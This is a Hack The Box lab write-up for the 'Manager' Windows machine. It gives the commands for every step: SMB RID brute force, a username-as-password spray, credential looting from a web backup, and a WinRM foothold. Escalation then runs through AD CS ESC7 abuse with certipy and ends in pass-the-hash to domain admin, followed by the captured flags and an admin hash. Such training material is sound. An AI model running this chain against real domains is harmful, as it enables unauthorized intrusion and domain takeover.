# 🧑‍💻 Hack The Box – Manager

## 📌 Overview
- **Machine Name:** Manager
- **IP Address(es):** 10.10.11.236
- **Difficulty:** Medium
- **OS:** Windows
- **Tags:** SMB / MSSQL / Web Config Loot / WinRM / AD CS (ESC7 → SubCA abuse) / Pass-the-Hash
- **Date Completed:** 2025.09.02
- **Status:** ✅ User | ✅ Root

---

## 🖥️ Initial Recon
### Nmap
```zsh
nmap -sC -sV -p- -Pn -oA nmap/manager 10.10.11.236 -T5
```

**Key findings:**
- Domain: `manager.htb`
- Web service (80) → “Manager” page
- MSSQL (1433) exposed
- Standard AD services (Kerberos, LDAP, SMB, WinRM)
- Certificate Services visible on domain (`dc01.manager.htb`)

---

## 📂 SMB Enumeration
```zsh
nxc smb manager.htb -u 'a' -p '' --shares
```
```
[*] Enumerated shares
IPC$ → READ
```

Enumerated users with RID brute force:
```zsh
nxc smb 10.10.11.236 -u 'Guest' -p '' --rid-brute
```

- Built a user list.  
- Password spray with username = password revealed a valid account:

```zsh
nxc smb manager.htb -u operator -p operator
[+] manager.htb\operator:operator
```

---

## 🗄️ MSSQL Enumeration
Logged in as operator to MSSQL and enumerated files.

```zsh
impacket-mssqlclient manager.htb/operator:operator@10.10.11.236 -windows-auth
```

Discovered old web backup:
```
website-backup-27-07-23-old.zip
```

Inside `.old.conf.xml` → hardcoded credentials:
```xml
<access-user>
  <user>raven@manager.htb</user>
  <password>R4v3nBe5tD3veloP3r!123</password>
</access-user>
```

---

## 🧭 BloodHound (Phase 1) – Raven
Collected domain data:
```zsh
bloodhound-ce-python -d manager.htb -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -c all -gc 10.10.11.236
```

- `Raven` has **WinRM access**.  

### Foothold
```zsh
evil-winrm -i 10.10.11.236 -u 'Raven' -p 'R4v3nBe5tD3veloP3r!123'
*Evil-WinRM* PS C:\Users\Raven\Desktop> type user.txt
94c90d8dc60ed0d67bd34851b0cd3081
```

✅ User shell obtained.

---

## 🧭 AD CS Enumeration
Found enterprise CA: **`manager-DC01-CA`**.

- Raven has **ManageCA** rights → can manipulate templates and officers.

Check vulnerable templates:
```zsh
certipy find -dc-ip 10.10.11.236 -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout -enable
```

Key finding:
- Able to enable and abuse **SubCA** template (ESC7).

---

## 🚀 Privilege Escalation – AD CS ESC7 Abuse
1. Add Raven as CA officer:
```zsh
certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

2. Enable vulnerable SubCA template:
```zsh
certipy ca -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -enable-template 'SubCA'
```

3. Request SubCA cert as Administrator:
```zsh
certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -template SubCA -upn administrator@manager.htb
```

- Request failed (expected) but gave request ID.

4. Issue the request manually:
```zsh
certipy ca -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -issue-request 25
```

5. Retrieve certificate:
```zsh
certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -retrieve 25
[*] Saved certificate and private key to 'administrator.pfx'
```

6. Authenticate with Administrator’s cert:
```zsh
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

7. Pass-the-Hash for DA shell:
```zsh
evil-winrm -i 10.10.11.236 -u Administrator -H ae5064c2f62317332c88629e025924ef
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
1ba1f70074d8cdee7f4884621bc398c6
```

✅ Full domain compromise.

---

## 🏁 Flags
- **User.txt:** `94c90d8dc60ed0d67bd34851b0cd3081`
- **Root.txt:** `1ba1f70074d8cdee7f4884621bc398c6`

---

## 🧠 Lessons Learned
**Technical**
- SMB RID brute force is still effective for username discovery.
- MSSQL often hides loot in web backups and config files.
- AD CS misconfigurations (ESC7 + ManageCA) can escalate directly to Domain Admin.
- Pass-the-Hash remains a reliable method once an admin hash is obtained.

**Personal**
- Reusing username = password is a major risk in enterprise AD.
- Checking old config files and backups consistently pays off.
- Don’t stop after finding ManageCA — escalate templates for persistence and escalation.

**Reusable Techniques**
- RID brute force → password spray with `username=username`.
- Loot web backups → extract creds from `.config`/`.xml`.
- Abuse AD CS officer + template permissions with `certipy`.
- SubCA template + cert issuance → Administrator cert → PTH to DA.
